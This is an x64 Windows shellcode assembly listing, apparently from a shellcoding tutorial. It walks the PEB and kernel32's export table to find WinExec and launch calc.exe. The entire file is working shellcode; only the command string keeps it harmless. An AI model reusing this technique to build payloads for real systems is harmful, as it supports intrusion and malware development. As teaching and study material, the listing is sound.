; https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
; https://www.m0n1x90.dev/blog/shellcoding/3

BITS 64

section .text
	global main

main:

.LoadDll:
	mov rax, [gs:0x60]		; PEB
	mov rax, [rax + 0x18]	; Ldr
	mov rax, [rax + 0x20]	; InMemoryOrderModuleList
	mov rax, [rax]
	mov rax, [rax]			; Kernel32.dll
	mov rax, [rax + 0x20]	; BaseAddress
	mov r8, rax				; Rax & r8 = Kernel32 Base Address

.FetchEAT:
	xor rax, rax
	xor rdx, rdx
	mov eax, [r8 + 0x3c]
	add rax, r8
	mov edx, [rax + 0x88]
	add rdx, r8
	mov r9, rdx

.FindWinExec:
	xor rax, rax
	mov eax, [rdx + 0x20]
	add rax, r8
	mov rsi, rax
	mov rdx, 0x636578456e695741 ; WinExec
	shr rdx, 8
	xor rcx, rcx

SearchFunctions:
	inc rcx
	xor rbx, rbx
	mov ebx, [rsi + (rcx*4)]
	add rbx, r8
	cmp qword [rbx], rdx
	jne SearchFunctions	; if ZF = 0, loop again

.QueryEAT:
	xor rax, rax
	mov eax, [r9 + 0x24]
	add rax, r8
	movzx rcx, word [rax + rcx*2]
	
	xor rax, rax
	mov eax, [r9 + 0x1c]
	add rax, r8
	mov edx, [rax + rcx*4]
	add rdx, r8
	mov rdi, rdx

.CallWinExec:
	xor rdx, rdx
	push rdx
	push rdx
	mov rcx, 0x6578652e636c6163;
    push rcx
	mov rcx, rsp
    sub rsp,0x50
	call rdi	
	add rsp, 0x68			
	ret